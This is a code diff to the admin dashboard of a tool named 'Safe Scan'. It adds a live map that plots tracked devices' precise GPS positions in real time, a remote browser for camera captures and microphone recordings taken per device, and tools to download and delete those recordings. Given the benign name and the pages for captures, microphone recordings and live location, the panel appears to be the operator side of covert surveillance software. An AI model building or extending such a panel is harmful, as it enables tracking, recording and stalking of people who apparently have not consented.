@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Safe Scan — Admin Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="/socket.io/socket.io.js"></script>
     <style>
         /* ═══════════════════ RESET & BASE ═══════════════════ */
@@ -519,6 +521,55 @@
             }
             #capturesGrid { grid-template-columns: 1fr !important; }
         }
+
+        /* ═══════════════════ MAP PAGE ═══════════════════ */
+        .map-container{width:100%;height:calc(100vh - 140px);border-radius:16px;overflow:hidden;border:1px solid rgba(255,255,255,0.08)}
+        .leaflet-container{background:#0a0a1a!important}
+        .map-marker-online{background:rgba(34,197,94,0.2);border:2px solid #22c55e;border-radius:50%;width:16px;height:16px;position:relative}
+        .map-marker-online::after{content:'';position:absolute;inset:3px;background:#22c55e;border-radius:50%}
+        .map-marker-offline{background:rgba(255,107,138,0.2);border:2px solid #ff6b8a;border-radius:50%;width:16px;height:16px;position:relative}
+        .map-marker-offline::after{content:'';position:absolute;inset:3px;background:#ff6b8a;border-radius:50%}
+        .map-stats{display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap}
+        .map-stat{padding:8px 16px;border-radius:10px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);font-size:0.8rem;color:rgba(255,255,255,0.5)}
+        .map-stat strong{color:#f0eef6}
+        .leaflet-popup-content-wrapper{background:rgba(17,17,40,0.95)!important;backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.1)!important;border-radius:12px!important;color:#f0eef6!important;box-shadow:0 8px 32px rgba(0,0,0,0.4)!important}
+        .leaflet-popup-tip{background:rgba(17,17,40,0.95)!important}
+        .leaflet-popup-close-button{color:rgba(255,255,255,0.4)!important}
+        .leaflet-control-zoom a{background:rgba(17,17,40,0.9)!important;color:#f0eef6!important;border-color:rgba(255,255,255,0.1)!important}
+
+        /* ═══════════════════ FILES PAGE ═══════════════════ */
+        .files-toolbar{display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap}
+        .files-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px}
+        .file-card{border-radius:12px;overflow:hidden;transition:all 0.3s;cursor:pointer}
+        .file-card:hover{transform:translateY(-3px);border-color:rgba(124,106,255,0.3)}
+        .file-card .file-preview{width:100%;aspect-ratio:4/3;object-fit:cover;display:block;background:rgba(0,0,0,0.3)}
+        .file-card .file-preview-audio{width:100%;aspect-ratio:4/3;display:flex;align-items:center;justify-content:center;background:rgba(255,184,108,0.05);color:#ffb86c}
+        .file-card .file-preview-audio svg{width:40px;height:40px}
+        .file-card .file-info{padding:10px}
+        .file-card .file-name{font-size:0.72rem;color:#a594fd;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+        .file-card .file-meta{font-size:0.65rem;color:rgba(255,255,255,0.3);margin-top:4px;display:flex;justify-content:space-between}
+        .file-card .file-actions{display:flex;gap:4px;padding:0 10px 10px}
+        .file-card .file-actions button{flex:1;padding:6px;border:none;border-radius:8px;font-size:0.7rem;cursor:pointer;font-family:inherit;transition:all 0.2s}
+        .file-card .file-actions .btn-download{background:rgba(93,228,199,0.1);color:#5de4c7;border:1px solid rgba(93,228,199,0.2)}
+        .file-card .file-actions .btn-download:hover{background:rgba(93,228,199,0.2)}
+        .file-card .file-actions .btn-del{background:rgba(255,107,138,0.1);color:#ff6b8a;border:1px solid rgba(255,107,138,0.2)}
+        .file-card .file-actions .btn-del:hover{background:rgba(255,107,138,0.2)}
+
+        /* ═══════════════════ RECORDINGS MANAGEMENT ═══════════════════ */
+        .rec-toolbar{display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap}
+        .rec-toolbar .glass-input{flex:1;min-width:150px}
+        .batch-bar{display:none;align-items:center;gap:12px;padding:10px 16px;margin-bottom:12px;border-radius:12px;background:rgba(255,107,138,0.08);border:1px solid rgba(255,107,138,0.2)}
+        .batch-bar.show{display:flex}
+        .batch-bar span{font-size:0.8rem;color:rgba(255,255,255,0.6);flex:1}
+        .batch-bar button{padding:6px 14px;border:none;border-radius:8px;font-size:0.75rem;cursor:pointer;font-family:inherit;background:rgba(255,107,138,0.15);color:#ff6b8a;border:1px solid rgba(255,107,138,0.3);transition:all 0.2s}
+        .batch-bar button:hover{background:rgba(255,107,138,0.25)}
+        .rec-checkbox{width:16px;height:16px;accent-color:#a594fd;cursor:pointer;flex-shrink:0}
+        .recording-card .rec-actions{display:flex;gap:6px;margin-top:8px}
+        .recording-card .rec-actions button{padding:5px 10px;border:none;border-radius:6px;font-size:0.7rem;cursor:pointer;font-family:inherit;transition:all 0.2s}
+        .rec-btn-download{background:rgba(93,228,199,0.1);color:#5de4c7;border:1px solid rgba(93,228,199,0.2)!important}
+        .rec-btn-download:hover{background:rgba(93,228,199,0.2)!important}
+        .rec-btn-delete{background:rgba(255,107,138,0.1);color:#ff6b8a;border:1px solid rgba(255,107,138,0.2)!important}
+        .rec-btn-delete:hover{background:rgba(255,107,138,0.2)!important}
     </style>
 </head>
 <body>
@@ -645,6 +696,14 @@
                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 12h.01"/><path d="M16 6V4a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v2"/><path d="M22 13a18.15 18.15 0 0 1-20 0"/><rect width="20" height="14" x="2" y="6" rx="2"/></svg>
                     Activity Log
                 </button>
+                <button class="nav-item" data-page="map" onclick="showPage('map')">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="1 6 1 22 8 18 16 22 23 18 23 2 16 6 8 2 1 6"/><line x1="8" x2="8" y1="2" y2="18"/><line x1="16" x2="16" y1="6" y2="22"/></svg>
+                    Live Map
+                </button>
+                <button class="nav-item" data-page="files" onclick="showPage('files')">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
+                    Files
+                </button>
             </nav>
             <div class="sidebar-bottom">
                 <button class="btn-logout" onclick="doLogout()">
@@ -743,7 +802,26 @@
                 <div class="page" id="page-recordings">
                     <div style="margin-bottom:20px">
                         <h3 style="font-size:1.1rem;font-weight:600;margin-bottom:4px">Audio Recordings</h3>
-                        <p style="font-size:0.8rem;color:rgba(255,255,255,0.35)">Browse and play all microphone recordings</p>
+                        <p style="font-size:0.8rem;color:rgba(255,255,255,0.35)">Browse, play, download and manage all microphone recordings</p>
+                    </div>
+                    <div class="rec-toolbar">
+                        <input type="text" class="glass-input" id="recSearch" placeholder="Search recordings..." oninput="filterRecordings()" style="max-width:250px">
+                        <select id="recUserFilter" class="glass-input" style="width:180px" onchange="loadRecordings()">
+                            <option value="">All Users</option>
+                        </select>
+                        <select id="recSortBy" class="glass-input" style="width:150px" onchange="loadRecordings()">
+                            <option value="date-desc">Newest First</option>
+                            <option value="date-asc">Oldest First</option>
+                            <option value="duration-desc">Longest First</option>
+                            <option value="duration-asc">Shortest First</option>
+                        </select>
+                        <label style="display:flex;align-items:center;gap:6px;font-size:0.8rem;color:rgba(255,255,255,0.4);cursor:pointer;white-space:nowrap">
+                            <input type="checkbox" class="rec-checkbox" id="recSelectAll" onchange="toggleSelectAll(this.checked)"> Select All
+                        </label>
+                    </div>
+                    <div class="batch-bar" id="batchBar">
+                        <span><strong id="batchCount">0</strong> selected</span>
+                        <button onclick="batchDeleteRecordings()">🗑️ Delete Selected</button>
                     </div>
                     <div id="recordingsList"></div>
                     <div id="noRecordings" class="empty-state" style="display:none">
@@ -849,6 +927,41 @@
                                 <tbody id="activityTable"></tbody>
                             </table>
                         </div>
+                    </div>
+                </div>
+
+                <!-- ═══ LIVE MAP PAGE ═══ -->
+                <div class="page" id="page-map">
+                    <div class="map-stats">
+                        <div class="map-stat">📍 Tracked: <strong id="mapTracked">0</strong></div>
+                        <div class="map-stat">🟢 Online: <strong id="mapOnline">0</strong></div>
+                        <div class="map-stat">🔴 Offline: <strong id="mapOffline">0</strong></div>
+                    </div>
+                    <div class="map-container" id="mapContainer"></div>
+                </div>
+
+                <!-- ═══ FILES PAGE ═══ -->
+                <div class="page" id="page-files">
+                    <div style="margin-bottom:20px">
+                        <h3 style="font-size:1.1rem;font-weight:600;margin-bottom:4px">Remote File Browser</h3>
+                        <p style="font-size:0.8rem;color:rgba(255,255,255,0.35)">Browse all captured photos and audio recordings by device</p>
+                    </div>
+                    <div class="files-toolbar">
+                        <select id="filesDeviceFilter" class="glass-input" style="width:200px" onchange="loadFiles()">
+                            <option value="">All Devices</option>
+                        </select>
+                        <select id="filesTypeFilter" class="glass-input" style="width:140px" onchange="loadFiles()">
+                            <option value="">All Types</option>
+                            <option value="capture">📷 Captures</option>
+                            <option value="recording">🎤 Recordings</option>
+                        </select>
+                        <span id="filesCount" style="font-size:0.8rem;color:rgba(255,255,255,0.35);margin-left:auto"></span>
+                    </div>
+                    <div id="filesGrid" class="files-grid"></div>
+                    <div id="noFiles" class="empty-state" style="display:none">
+                        <div class="empty-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg></div>
+                        <h3>No files found</h3>
+                        <p>Media files from connected devices will appear here.</p>
                     </div>
                 </div>
             </div>
@@ -1187,7 +1300,7 @@ function showPage(page) {
     document.getElementById('page-' + page).classList.add('active');
     document.querySelector(`.nav-item[data-page="${page}"]`).classList.add('active');
 
-    const titles = { feeds: 'Live Feeds', users: 'Users', recordings: 'Recordings', settings: 'Settings', analytics: 'Analytics', captures: 'Captures Gallery', activity: 'Activity Log' };
+    const titles = { feeds: 'Live Feeds', users: 'Users', recordings: 'Recordings', settings: 'Settings', analytics: 'Analytics', captures: 'Captures Gallery', activity: 'Activity Log', map: 'Live Map', files: 'Files' };
     document.getElementById('pageTitle').textContent = titles[page];
 
     if (page === 'users') loadUsers();
@@ -1196,6 +1309,8 @@ function showPage(page) {
     if (page === 'analytics') loadAnalytics();
     if (page === 'captures') loadCapturesGallery();
     if (page === 'activity') loadActivityLog();
+    if (page === 'map') initMap();
+    if (page === 'files') loadFiles();
 
     closeSidebar();
 }
@@ -2098,6 +2213,347 @@ function exportData() {
         a.href = url; a.download = 'safescan_export.json'; a.click();
         URL.revokeObjectURL(url);
     }).catch(() => {});
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// LIVE MAP (Leaflet.js)
+// ═══════════════════════════════════════════════════════════════════
+let map = null;
+let mapMarkers = {};
+let mapInitialized = false;
+
+function initMap() {
+    if (mapInitialized && map) {
+        map.invalidateSize();
+        loadMapLocations();
+        return;
+    }
+    mapInitialized = true;
+
+    map = L.map('mapContainer', {
+        center: [20, 0],
+        zoom: 2,
+        zoomControl: true,
+        attributionControl: false
+    });
+
+    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+        maxZoom: 19,
+        subdomains: 'abcd'
+    }).addTo(map);
+
+    loadMapLocations();
+}
+
+async function loadMapLocations() {
+    try {
+        const data = await api('/api/locations');
+        if (!data || !data.locations) return;
+
+        let online = 0, offline = 0;
+
+        data.locations.forEach(loc => {
+            const isOnline = loc.is_online;
+            if (isOnline) online++; else offline++;
+
+            const markerId = loc.uuid;
+            const latlng = [loc.latitude, loc.longitude];
+
+            const iconHtml = isOnline
+                ? '<div class="map-marker-online"></div>'
+                : '<div class="map-marker-offline"></div>';
+
+            const icon = L.divIcon({
+                html: iconHtml,
+                className: '',
+                iconSize: [16, 16],
+                iconAnchor: [8, 8]
+            });
+
+            const popupContent = `<div style="font-family:'Inter',sans-serif;font-size:0.8rem">
+                <div style="color:#a594fd;font-family:monospace;font-size:0.75rem">${loc.uuid}</div>
+                <div style="color:rgba(255,255,255,0.6);margin-top:4px">${isOnline ? '🟢 Online' : '🔴 Offline'} • ${loc.device_type || 'Unknown'} • ${loc.browser || ''}</div>
+                <div style="color:rgba(255,255,255,0.4);font-size:0.7rem;margin-top:4px">📍 ${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}${loc.accuracy ? ' • ±' + loc.accuracy.toFixed(0) + 'm' : ''}</div>
+                <div style="color:rgba(255,255,255,0.4);font-size:0.7rem">🕐 ${loc.timestamp ? new Date(loc.timestamp).toLocaleString() : 'Unknown'}</div>
+                <div style="margin-top:6px"><a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#5de4c7;font-size:0.7rem;text-decoration:none">Open in Google Maps ↗</a></div>
+            </div>`;
+
+            if (mapMarkers[markerId]) {
+                mapMarkers[markerId].setLatLng(latlng).setIcon(icon);
+                mapMarkers[markerId].setPopupContent(popupContent);
+            } else {
+                mapMarkers[markerId] = L.marker(latlng, { icon })
+                    .addTo(map)
+                    .bindPopup(popupContent);
+            }
+        });
+
+        document.getElementById('mapTracked').textContent = data.locations.length;
+        document.getElementById('mapOnline').textContent = online;
+        document.getElementById('mapOffline').textContent = offline;
+
+        if (data.locations.length > 0) {
+            const bounds = L.latLngBounds(data.locations.map(l => [l.latitude, l.longitude]));
+            map.fitBounds(bounds.pad(0.3));
+        }
+    } catch(e) { console.error('Map load error:', e); }
+}
+
+// Real-time location updates on map
+socket.on('location:update', (loc) => {
+    if (!map || !mapInitialized) return;
+
+    const markerId = loc.uuid;
+    const latlng = [loc.latitude, loc.longitude];
+    const icon = L.divIcon({
+        html: '<div class="map-marker-online"></div>',
+        className: '',
+        iconSize: [16, 16],
+        iconAnchor: [8, 8]
+    });
+
+    const user = allUsers[loc.uuid];
+    const popupContent = `<div style="font-family:'Inter',sans-serif;font-size:0.8rem">
+        <div style="color:#a594fd;font-family:monospace;font-size:0.75rem">${loc.uuid}</div>
+        <div style="color:rgba(255,255,255,0.6);margin-top:4px">🟢 Online • ${user?.device_type || 'Unknown'} • ${user?.browser || ''}</div>
+        <div style="color:rgba(255,255,255,0.4);font-size:0.7rem;margin-top:4px">📍 ${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}${loc.accuracy ? ' • ±' + loc.accuracy.toFixed(0) + 'm' : ''}</div>
+        <div style="color:rgba(255,255,255,0.4);font-size:0.7rem">🕐 ${new Date().toLocaleString()}</div>
+        <div style="margin-top:6px"><a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" style="color:#5de4c7;font-size:0.7rem;text-decoration:none">Open in Google Maps ↗</a></div>
+    </div>`;
+
+    if (mapMarkers[markerId]) {
+        mapMarkers[markerId].setLatLng(latlng).setIcon(icon);
+        mapMarkers[markerId].setPopupContent(popupContent);
+    } else {
+        mapMarkers[markerId] = L.marker(latlng, { icon })
+            .addTo(map)
+            .bindPopup(popupContent);
+    }
+
+    addNotification('📍', 'Location update from ' + truncUUID(loc.uuid));
+});
+
+// ═══════════════════════════════════════════════════════════════════
+// FILES BROWSER
+// ═══════════════════════════════════════════════════════════════════
+let filesPopulated = false;
+
+async function loadFiles() {
+    const deviceFilter = document.getElementById('filesDeviceFilter').value;
+    const typeFilter = document.getElementById('filesTypeFilter').value;
+
+    // Populate device dropdown once
+    if (!filesPopulated) {
+        filesPopulated = true;
+        const usersData = await api('/api/users');
+        const select = document.getElementById('filesDeviceFilter');
+        (usersData?.users || []).forEach(u => {
+            const opt = document.createElement('option');
+            opt.value = u.uuid;
+            opt.textContent = truncUUID(u.uuid, 12) + ' — ' + (u.device_type || 'Unknown');
+            select.appendChild(opt);
+        });
+    }
+
+    let url = '/api/files';
+    if (deviceFilter) url += '?uuid=' + deviceFilter;
+    const data = await api(url);
+
+    const grid = document.getElementById('filesGrid');
+    const empty = document.getElementById('noFiles');
+
+    let files = data?.files || [];
+    if (typeFilter) files = files.filter(f => f.type === typeFilter);
+
+    document.getElementById('filesCount').textContent = files.length + ' files';
+
+    if (files.length === 0) {
+        grid.innerHTML = '';
+        empty.style.display = 'flex';
+        return;
+    }
+    empty.style.display = 'none';
+
+    grid.innerHTML = files.map(f => {
+        const isCapture = f.type === 'capture';
+        const preview = isCapture
+            ? `<img class="file-preview" src="${API}${f.url}" alt="" loading="lazy">`
+            : `<div class="file-preview-audio"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" x2="12" y1="19" y2="22"/></svg></div>`;
+        const sizeStr = f.file_size ? (f.file_size / 1024).toFixed(1) + ' KB' : '';
+        const typeIcon = isCapture ? '📷' : '🎤';
+        const fileName = f.file_path ? f.file_path.split('/').pop() : 'file';
+        return `<div class="file-card glass">
+            ${preview}
+            <div class="file-info">
+                <div class="file-name">${typeIcon} ${truncUUID(f.uuid, 8)}</div>
+                <div class="file-meta"><span>${sizeStr}</span><span>${new Date(f.created_at).toLocaleString()}</span></div>
+                ${!isCapture && f.duration ? '<div class="file-meta" style="margin-top:2px"><span>Duration: ' + fmtDuration(f.duration) + '</span></div>' : ''}
+            </div>
+            <div class="file-actions">
+                <button class="btn-download" onclick="downloadFile('${API}${f.url}', '${fileName}')">⬇ Download</button>
+                <button class="btn-del" onclick="deleteFile('${f.type}', ${f.id})">🗑️ Delete</button>
+            </div>
+        </div>`;
+    }).join('');
+}
+
+function downloadFile(url, filename) {
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    a.target = '_blank';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+}
+
+async function deleteFile(type, id) {
+    if (!confirm('Delete this file permanently?')) return;
+    const endpoint = type === 'capture' ? '/api/captures/' + id : '/api/recordings/' + id;
+    await api(endpoint, { method: 'DELETE' });
+    loadFiles();
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// ENHANCED RECORDINGS MANAGEMENT
+// ═══════════════════════════════════════════════════════════════════
+let selectedRecordings = new Set();
+let allRecordingsData = [];
+let recUsersPopulated = false;
+
+// Override loadRecordings with enhanced version
+loadRecordings = async function() {
+    const userFilter = document.getElementById('recUserFilter')?.value || '';
+    const sortBy = document.getElementById('recSortBy')?.value || 'date-desc';
+
+    // Populate user dropdown once
+    if (!recUsersPopulated) {
+        recUsersPopulated = true;
+        const usersData = await api('/api/users');
+        const select = document.getElementById('recUserFilter');
+        if (select && select.options.length <= 1) {
+            (usersData?.users || []).forEach(u => {
+                const opt = document.createElement('option');
+                opt.value = u.uuid;
+                opt.textContent = truncUUID(u.uuid, 12) + ' — ' + (u.device_type || 'Unknown');
+                select.appendChild(opt);
+            });
+        }
+    }
+
+    let url = '/api/recordings';
+    if (userFilter) url += '?uuid=' + userFilter;
+    const data = await api(url);
+    if (!data || !data.recordings) return;
+
+    allRecordingsData = data.recordings;
+
+    // Sort
+    switch(sortBy) {
+        case 'date-asc': allRecordingsData.sort((a,b) => new Date(a.created_at) - new Date(b.created_at)); break;
+        case 'duration-desc': allRecordingsData.sort((a,b) => (b.duration||0) - (a.duration||0)); break;
+        case 'duration-asc': allRecordingsData.sort((a,b) => (a.duration||0) - (b.duration||0)); break;
+        default: allRecordingsData.sort((a,b) => new Date(b.created_at) - new Date(a.created_at));
+    }
+
+    selectedRecordings.clear();
+    updateBatchBar();
+    renderRecordingsList(allRecordingsData);
+};
+
+function filterRecordings() {
+    const q = (document.getElementById('recSearch')?.value || '').toLowerCase();
+    if (!q) { renderRecordingsList(allRecordingsData); return; }
+    const filtered = allRecordingsData.filter(r =>
+        (r.uuid || '').toLowerCase().includes(q) ||
+        (r.file_path || '').toLowerCase().includes(q) ||
+        (r.mime_type || '').toLowerCase().includes(q)
+    );
+    renderRecordingsList(filtered);
+}
+
+function renderRecordingsList(recordings) {
+    const list = document.getElementById('recordingsList');
+    const empty = document.getElementById('noRecordings');
+
+    if (recordings.length === 0) {
+        list.innerHTML = '';
+        empty.style.display = 'flex';
+        return;
+    }
+    empty.style.display = 'none';
+
+    list.innerHTML = recordings.map(r => {
+        const fileName = r.file_path ? r.file_path.split('/').pop() : 'recording';
+        return `
+        <div class="recording-card glass">
+            <div class="rec-header" style="display:flex;align-items:center;gap:10px">
+                <input type="checkbox" class="rec-checkbox" data-id="${r.id}" ${selectedRecordings.has(r.id) ? 'checked' : ''} onchange="toggleRecSelect(${r.id}, this.checked)">
+                <div class="rec-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" x2="12" y1="19" y2="22"/></svg></div>
+                <div class="rec-info">
+                    <div class="rec-user"><span>${truncUUID(r.uuid, 10)}</span> • ${fmtDuration(r.duration)}</div>
+                    <div class="rec-time">${new Date(r.created_at).toLocaleString()}</div>
+                </div>
+            </div>
+            <div class="audio-player" id="player-${r.id}">
+                <button class="play-btn" onclick="toggleAudio(${r.id}, '${API}/media/${r.file_path}')">
+                    <svg class="icon-play" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                    <svg class="icon-pause" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" style="display:none"><rect width="4" height="14" x="6" y="5"/><rect width="4" height="14" x="14" y="5"/></svg>
+                </button>
+                <div class="progress-wrap" onclick="seekAudio(event, ${r.id})"><div class="progress-bar" id="prog-${r.id}"></div></div>
+                <span class="audio-time" id="time-${r.id}">0:00 / ${fmtDuration(r.duration)}</span>
+            </div>
+            <div class="rec-actions">
+                <button class="rec-btn-download" onclick="downloadFile('${API}/media/${r.file_path}', '${fileName}')" title="Download">⬇ Download</button>
+                <button class="rec-btn-delete" onclick="deleteSingleRecording(${r.id})" title="Delete">🗑️ Delete</button>
+            </div>
+        </div>`;
+    }).join('');
+}
+
+function toggleRecSelect(id, checked) {
+    if (checked) selectedRecordings.add(id); else selectedRecordings.delete(id);
+    updateBatchBar();
+}
+
+function toggleSelectAll(checked) {
+    document.querySelectorAll('.rec-checkbox[data-id]').forEach(cb => {
+        cb.checked = checked;
+        const id = parseInt(cb.dataset.id);
+        if (checked) selectedRecordings.add(id); else selectedRecordings.delete(id);
+    });
+    updateBatchBar();
+}
+
+function updateBatchBar() {
+    const bar = document.getElementById('batchBar');
+    const count = document.getElementById('batchCount');
+    if (selectedRecordings.size > 0) {
+        bar.classList.add('show');
+        count.textContent = selectedRecordings.size;
+    } else {
+        bar.classList.remove('show');
+    }
+}
+
+async function batchDeleteRecordings() {
+    if (selectedRecordings.size === 0) return;
+    if (!confirm(`Delete ${selectedRecordings.size} recording(s) permanently?`)) return;
+
+    await api('/api/recordings/batch-delete', {
+        method: 'POST',
+        body: JSON.stringify({ ids: Array.from(selectedRecordings) })
+    });
+    selectedRecordings.clear();
+    const selAll = document.getElementById('recSelectAll');
+    if (selAll) selAll.checked = false;
+    loadRecordings();
+}
+
+async function deleteSingleRecording(id) {
+    if (!confirm('Delete this recording permanently?')) return;
+    await api('/api/recordings/' + id, { method: 'DELETE' });
+    loadRecordings();
 }
 </script>
 </body>
